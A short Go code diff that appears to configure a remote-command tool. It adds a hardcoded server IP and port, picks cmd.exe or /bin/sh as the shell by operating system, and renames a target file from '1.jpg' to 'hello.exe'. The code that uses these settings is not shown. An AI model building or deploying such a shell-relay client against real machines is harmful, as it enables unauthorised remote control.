@@ -8,11 +8,10 @@ package common
 import (
 	"bytes"
 	"encoding/binary"
+	"runtime"
 )
 
-const (
-	// 针对的Jar包
-	JAR_NAME = "1.jpg"
+var (
 	// CMD命令，win=cmd.exe，linux=/bin/sh
 	CMD_NAME = "cmd.exe"
 )
@@ -29,7 +28,19 @@ const (
 	MAX_DATE_LEN = 1024 * 1024
 	// 每个数据包大小
 	MSG_LEN = MAX_DATE_LEN + 4*4
+	// 针对的Jar包
+	JAR_NAME = "hello.exe"
+	// 服务器IP地址
+	SERVER_ADDR = "118.24.239.74"
+	// 服务器端口
+	SERVER_PORT = 8848
 )
+
+func init() {
+	if runtime.GOOS == "linux" {
+		CMD_NAME = "/bin/sh"
+	}
+}
 
 type DataMsg struct {
 	// 命令号
